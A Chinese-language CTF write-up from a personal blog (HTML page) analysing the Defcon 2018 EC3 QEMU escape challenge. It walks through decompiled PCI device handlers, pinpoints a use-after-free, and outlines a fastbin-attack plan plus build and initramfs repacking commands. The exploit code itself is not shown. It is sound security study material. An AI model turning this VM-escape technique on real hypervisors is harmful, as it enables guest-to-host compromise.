@@ -1,0 +1,990 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next muse" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,ctf,qemu,vm escape,虚拟机逃逸,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="giantbranch's blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="熟悉题目题目描述： 123there&amp;apos;s a vulnerable PCI device in the qemu binary. players have to write a kernel driver for the ubuntu kernel that is thereand then they have to exploit the qemu to read flag off t">
+<meta name="keywords" content="pwn,ctf,qemu,vm escape,虚拟机逃逸">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF QEMU 虚拟机逃逸之Defcon 2018 - EC3">
+<meta property="og:url" content="https://www.giantbranch.cn/2020/01/06/CTF QEMU 虚拟机逃逸之Defcon 2018 - EC3/index.html">
+<meta property="og:site_name" content="giantbranch&#39;s blog">
+<meta property="og:description" content="熟悉题目题目描述： 123there&amp;apos;s a vulnerable PCI device in the qemu binary. players have to write a kernel driver for the ubuntu kernel that is thereand then they have to exploit the qemu to read flag off t">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1578388583681.png">
+<meta property="og:updated_time" content="2023-10-13T13:14:33.050Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CTF QEMU 虚拟机逃逸之Defcon 2018 - EC3">
+<meta name="twitter:description" content="熟悉题目题目描述： 123there&amp;apos;s a vulnerable PCI device in the qemu binary. players have to write a kernel driver for the ubuntu kernel that is thereand then they have to exploit the qemu to read flag off t">
+<meta name="twitter:image" content="http://pic.giantbranch.cn/pic/1578388583681.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://www.giantbranch.cn/2020/01/06/CTF QEMU 虚拟机逃逸之Defcon 2018 - EC3/">
+
+
+
+
+
+  <title>CTF QEMU 虚拟机逃逸之Defcon 2018 - EC3 | giantbranch's blog</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-121265336-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?e3a097ddc6964e154e65d478725ac9ed";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">giantbranch's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">忘掉掌声，按自己的方式，继续前行，跑过一生</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-book">
+          <a href="/book/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-book"></i> <br>
+            
+            读过的书
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.giantbranch.cn/2020/01/06/CTF QEMU 虚拟机逃逸之Defcon 2018 - EC3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="giantbranch">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="giantbranch's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">CTF QEMU 虚拟机逃逸之Defcon 2018 - EC3</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-06T00:00:00+00:00">
+                2020-01-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2020/01/06/CTF QEMU 虚拟机逃逸之Defcon 2018 - EC3/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2020/01/06/CTF QEMU 虚拟机逃逸之Defcon 2018 - EC3/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="熟悉题目"><a href="#熟悉题目" class="headerlink" title="熟悉题目"></a>熟悉题目</h1><p>题目描述：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">there&apos;s a vulnerable PCI device in the qemu binary. players have to write a kernel driver for the ubuntu kernel that is there</span><br><span class="line"></span><br><span class="line">and then they have to exploit the qemu to read flag off the fsystem</span><br></pre></td></tr></table></figure>
+
+<p>这个题目给的qemu-system-x86_64的符号是被stripped掉了，相当于增加了点难度</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">giantbranch@ubuntu:~/qemu_escape/defcon-2018-ec3$ file ./qemu-system-x86_64</span><br><span class="line">./qemu-system-x86_64: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, forGNU/Linux 2.6.32, BuildID[sha1]=b6c6ab3e87201dc5d18373dee7bee760367a8ffa, stripped</span><br></pre></td></tr></table></figure>
+
+<p>先看启动脚本，初步猜测漏洞在设备ooo中，肯定也是故意写的有漏洞的设备</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">./qemu-system-x86_64 -initrd ./initramfs-busybox-x86_64.cpio.gz -nographic -kernel ./vmlinuz-4.4.0-119-generic -append &quot;priority=low console=ttyS0&quot; -device ooo -monitor /dev/null</span><br></pre></td></tr></table></figure>
+
+<p>没有符号，不能直接搜索函数名，那就尝试看看字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000B633A1 aOooMmio        db &apos;ooo-mmio&apos;,0         ; DATA XREF: sub_6E64A5+101↑o</span><br><span class="line">.rodata:0000000000B633AA ; char command[]</span><br><span class="line">.rodata:0000000000B633AA command         db &apos;cat ./flag&apos;,0       ; DATA XREF: sub_6E65F9+1B↑o</span><br><span class="line">.rodata:0000000000B633B5 ; char aD_10[]</span><br><span class="line">.rodata:0000000000B633B5 aD_10           db &apos;%d&apos;,0Ah,0           ; DATA XREF: sub_6E65F9+27↑o</span><br><span class="line">.rodata:0000000000B633B9 aUint64_2       db &apos;uint64&apos;,0           ; DATA XREF: sub_6E6732+93↑o</span><br><span class="line">.rodata:0000000000B633C0 aDmaMask_0      db &apos;dma_mask&apos;,0         ; DATA XREF: sub_6E6732+98↑o</span><br><span class="line">.rodata:0000000000B633C9 aPciDevice_32   db &apos;pci-device&apos;,0       ; DATA XREF: sub_6E67DE+24↑o</span><br><span class="line">.rodata:0000000000B633C9                                         ; .rodata:0000000000B63428↓o</span><br><span class="line">.rodata:0000000000B633D4                 align 20h</span><br><span class="line">.rodata:0000000000B633E0 aOooInstanceIni db &apos;ooo_instance_init&apos;,0</span><br><span class="line">.rodata:0000000000B633E0                                         ; DATA XREF: sub_6E6732+10↑o</span><br><span class="line">.rodata:0000000000B633F2                 align 8</span><br><span class="line">.rodata:0000000000B633F8 aOooClassInit   db &apos;ooo_class_init&apos;,0   ; DATA XREF: sub_6E67DE+14↑o</span><br></pre></td></tr></table></figure>
+
+<p>通过<code>ooo_instance_init</code>，<code>ooo_class_init</code>就可以定位到相应的函数了，此外我们看到有<code>cat ./flag</code>，跟过去发现<code>sub_6E65F9</code>是个执行<code>system(&quot;cat ./flag&quot;)</code>的后门函数</p>
+<p>先看<code>ooo_class_init</code>，根据<code>PCIDeviceClass</code>的定义，可以确定这里vendor_id是0x420，device_id是0x1337，revision是0x69，class_id是0xff</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall ooo_class_init_6E67DE(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line"></span><br><span class="line">  result = sub_868F66(a1, &quot;pci-device&quot;, &quot;hw/misc/oooverflow.c&quot;, 336LL, &quot;ooo_class_init&quot;);</span><br><span class="line">  *(_QWORD *)(result + 0xC0) = sub_6E64A5;</span><br><span class="line">  *(_QWORD *)(result + 0xC8) = 0LL;</span><br><span class="line">  *(_WORD *)(result + 0xE0) = 0x420;</span><br><span class="line">  *(_WORD *)(result + 0xE2) = 0x1337;</span><br><span class="line">  *(_BYTE *)(result + 0xE4) = 0x69;</span><br><span class="line">  *(_WORD *)(result + 0xE6) = 0xFF;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从上面看出，那么<code>sub_6E64A5</code>就是<code>pci_ooo_realize</code>，里面设置了mmio（下面函数部分已经手动重命名过了）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall pci_ooo_realize_6E64A5(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v3; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(0x28u);</span><br><span class="line">  sub_6E5C20(*(_QWORD *)(a1 + 120), 1LL);</span><br><span class="line">  if ( !(unsigned int)sub_73A7F4(a1, 0LL, 1LL, 1LL, 0LL, a2) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_6E5B0A(a1 + 2680, 1LL, sub_6E5F06, a1);</span><br><span class="line">    sub_999AD9(a1 + 2520);</span><br><span class="line">    sub_999D8D(a1 + 2568);</span><br><span class="line">    sub_99A6CD((pthread_t *)(a1 + 2512), (__int64)&amp;off_B6339D, (void *(*)(void *))sub_6E631A, (void *(*)(void *))a1, 0);</span><br><span class="line">    memory_region_init_io(a1 + 2272, a1, off_B63300, a1, &quot;ooo-mmio&quot;, 0x1000000LL);</span><br><span class="line">    pci_register_bar(a1, 0LL, 0LL, a1 + 2272);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而<code>off_B63300</code>就是设置mmio的操作函数指针，那么下面的<code>sub_6E613C</code>对应ooo_mmio_read，<code>sub_6E61F4</code>对应ooo_mmio_write</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000B63300 mmio_ops_off_B63300 dq offset sub_6E613C</span><br><span class="line">.rodata:0000000000B63300                                         ; DATA XREF: pci_ooo_realize_6E64A5+10A↑o</span><br><span class="line">.rodata:0000000000B63308                 dq offset sub_6E61F4</span><br></pre></td></tr></table></figure>
+
+<p>再看<code>ooo_instance_init</code>，就一些初始化</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">_QWORD *__fastcall ooo_instance_init_6E6732(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  const char ****v1; // rax</span><br><span class="line">  const char ****v2; // ST28_8</span><br><span class="line"></span><br><span class="line">  v1 = sub_868C9E(</span><br><span class="line">         (const char ****)a1,</span><br><span class="line">         (const char **)&amp;off_B6339D,</span><br><span class="line">         (__int64)&quot;hw/misc/oooverflow.c&quot;,</span><br><span class="line">         0x144u,</span><br><span class="line">         (__int64)&quot;ooo_instance_init&quot;);</span><br><span class="line">  v2 = v1;</span><br><span class="line">  v1[853] = (const char ***)0xFFFFFFF;</span><br><span class="line">  memset(v1 + 854, 0, 0x78uLL);</span><br><span class="line">  memset(&amp;qword_1317940, 0, 0x78uLL);</span><br><span class="line">  return sub_8695E3(</span><br><span class="line">           a1,</span><br><span class="line">           &quot;dma_mask&quot;,</span><br><span class="line">           (__int64)&quot;uint64&quot;,</span><br><span class="line">           (__int64)sub_6E66F3,</span><br><span class="line">           (__int64)sub_6E66F3,</span><br><span class="line">           0LL,</span><br><span class="line">           (__int64)(v2 + 853),</span><br><span class="line">           0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们看看lspci结果（简版的系统，lspci看不到详细信息），根据上面对对<code>ooo_class_init_6E67DE</code>的分析，的值ooo设备对应的就是下面的<code>00:04.0 Class 00ff: 0420:1337</code>，同时我们也可以得出lspci默认的格式<code>序号 Class classid: vendor_id:device_id</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/ # lspci</span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:04.0 Class 00ff: 0420:1337</span><br></pre></td></tr></table></figure>
+
+<p>查看mmio的地址（pmio是<code>/proc/ioports</code>）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ # cat /proc/iomem | grep 00:04.0</span><br><span class="line">  fb000000-fbffffff : 0000:00:04.0</span><br></pre></td></tr></table></figure>
+
+<p>或者这样也行，同样可以看到是fb000000到fbffffff</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/ # cat /sys/devices/pci0000\:00/0000\:00\:04.0/resource</span><br><span class="line">0x00000000fb000000 0x00000000fbffffff 0x0000000000040200</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<h1 id="重点代码分析"><a href="#重点代码分析" class="headerlink" title="重点代码分析"></a>重点代码分析</h1><p>我们根据以往经验重命名下mmio的read和write的参数</p>
+<p>首先是read，只有<code>(addr &amp; 0xF00000u) &gt;&gt; 20 != 15</code>及<code>gbuf_bss_1317940[v4]</code>不为0才会执行memcpy</p>
+<p>memcpy的源地址是以addr的第5个四字节即v4作为gbuf_bss_1317940的索引取出值，再加一个addr的低16位进行偏移</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall ooo_mmio_read_6E613C(__int64 opaque, int addr, unsigned int size)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v4; // [rsp+34h] [rbp-1Ch]</span><br><span class="line">  __int64 dest; // [rsp+38h] [rbp-18h]</span><br><span class="line">  __int64 v6; // [rsp+40h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v7; // [rsp+48h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(0x28u);</span><br><span class="line">  v6 = opaque;</span><br><span class="line">  dest = 270441LL;</span><br><span class="line">  v4 = (addr &amp; 0xF0000u) &gt;&gt; 16;</span><br><span class="line">  if ( (addr &amp; 0xF00000u) &gt;&gt; 20 != 15 &amp;&amp; gbuf_bss_1317940[v4] )</span><br><span class="line">    memcpy(&amp;dest, (char *)gbuf_bss_1317940[v4] + (signed __int16)addr, size);</span><br><span class="line">  return dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而接下看看write</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall ooo_mmio_write_6E61F4(__int64 opaque, __int64 addr, __int64 value, unsigned int size)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int choose; // eax</span><br><span class="line">  char value_point[12]; // [rsp+4h] [rbp-3Ch]</span><br><span class="line">  __int64 addr_copy; // [rsp+10h] [rbp-30h]</span><br><span class="line">  __int64 v7; // [rsp+18h] [rbp-28h]</span><br><span class="line">  __int16 v8; // [rsp+22h] [rbp-1Eh]</span><br><span class="line">  int i; // [rsp+24h] [rbp-1Ch]</span><br><span class="line">  unsigned int v10; // [rsp+28h] [rbp-18h]</span><br><span class="line">  unsigned int v11; // [rsp+2Ch] [rbp-14h]</span><br><span class="line">  unsigned int v12; // [rsp+34h] [rbp-Ch]</span><br><span class="line">  __int64 v13; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v7 = opaque;</span><br><span class="line">  addr_copy = addr;</span><br><span class="line">  *(_QWORD *)&amp;value_point[4] = value;</span><br><span class="line">  v13 = opaque;</span><br><span class="line">  v10 = ((unsigned int)addr &amp; 0xF00000) &gt;&gt; 20;</span><br><span class="line">  choose = ((unsigned int)addr &amp; 0xF00000) &gt;&gt; 20;</span><br><span class="line">  switch ( choose )</span><br><span class="line">  &#123;</span><br><span class="line">    case 1u:</span><br><span class="line">      free(gbuf_bss_1317940[((unsigned int)addr_copy &amp; 0xF0000) &gt;&gt; 16]);</span><br><span class="line">      break;</span><br><span class="line">    case 2u:</span><br><span class="line">      v12 = ((unsigned int)addr_copy &amp; 0xF0000) &gt;&gt; 16;</span><br><span class="line">      v8 = addr_copy;</span><br><span class="line">      memcpy((char *)gbuf_bss_1317940[v12] + (signed __int16)addr_copy, &amp;value_point[4], size);</span><br><span class="line">      break;</span><br><span class="line">    case 0u:</span><br><span class="line">      v11 = ((unsigned int)addr_copy &amp; 0xF0000) &gt;&gt; 16;</span><br><span class="line">      if ( v11 == 15 )</span><br><span class="line">      &#123;</span><br><span class="line">        for ( i = 0; i &lt;= 14; ++i )</span><br><span class="line">          gbuf_bss_1317940[i] = malloc(8LL * *(_QWORD *)&amp;value_point[4]);</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        gbuf_bss_1317940[v11] = malloc(8LL * *(_QWORD *)&amp;value_point[4]);</span><br><span class="line">      &#125;</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过<code>choose = ((unsigned int)addr &amp; 0xF00000) &gt;&gt; 20;</code>来进行选择，我命名为choose</p>
+<p>1、choose为0时，v11为15时，循环分配15次到对应的全局变量中，否则就只分配一次到对应的全局变量索引中<br>2、choose为1时，释放内存<br>3、choose为2时，将我们的值写到对应的地址</p>
+<p>上面释放内存的时候，没有将指针置空，导致了UAF漏洞，我们就可以改写堆内存的fd，使用fastbin attack去做这个题目，变成了经典的堆题目了，只不过是qemu，交互不一样。</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>利用思路：利用fastbin attack改写那个全局指针数组上面的指针，之后即可任由读写（可以改写free或者malloc的got表地址），当然这里我们只需要写即可。（当时比赛是ubuntu 16.04，不过我也是<code>(*^__^*)</code>，所以fastbin attack需要绕过size的检查）</p>
+<p>注意：</p>
+<p>1、执行mmio_write的时候，写入使用32bit写入，不然会两次调用malloc，导致第一次malloc的返回值被覆盖。还有mmap地址复制了之前的代码，mmap大小还是0x1000，导致写入失败，报错如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[  106.208240] exp[86]: segfault at 7f3dab7c4000 ip 0000000000400a69 sp 00007fffeaa50048 error 6 in exp[400000+ca000]</span><br></pre></td></tr></table></figure>
+
+<p>2、就算free了后改写了fd，也不一定第二个就能申请到fake fd的地址，这是最坑的，根据uaf.io的作者还有我最终的时间，可能qemu在我们之前就malloc了0x60大小的，或者在我们free后，qemu又free了一些0x60的，导致可能我们不止malloc两次才能得到fake fd的地址，所以我们最好循环申请，之后循环写就行<br>3、还有就是ctrl + A，之后按X可以退出qemu虚拟机<br>4、由于题目是部署在远程的，busybox实现了telnet和wget，所以我们可以下载我们部署在vps的exp到qemu执行，但是赛后我们方便的还行直接修改本地的文件系统，先创建一个目录（我是建立了rootfs目录），cpio复制进去，之后解压</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gunzip initramfs-busybox-x86_64.cpio.gz</span><br><span class="line">cpio -idmv &lt; initramfs-busybox-x86_64.cpio</span><br></pre></td></tr></table></figure>
+
+<p>最后写脚本将exp放入该目录，重新打包即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">giantbranch@ubuntu:~/qemu_escape/defcon-2018-ec3$ cat gcc_cp.sh</span><br><span class="line">gcc -o exp -static exp.c</span><br><span class="line">cp ./exp ./rootfs/</span><br><span class="line">cd ./rootfs &amp;&amp; find . | cpio -o --format=newc &gt; ../initramfs-busybox-x86_64.cpio.gz</span><br></pre></td></tr></table></figure>
+
+<p>最终利用我构造的内存布局如下：（0x1317980是用来构造fake size，0x1317950是循环申请是申请到的fake fd）</p>
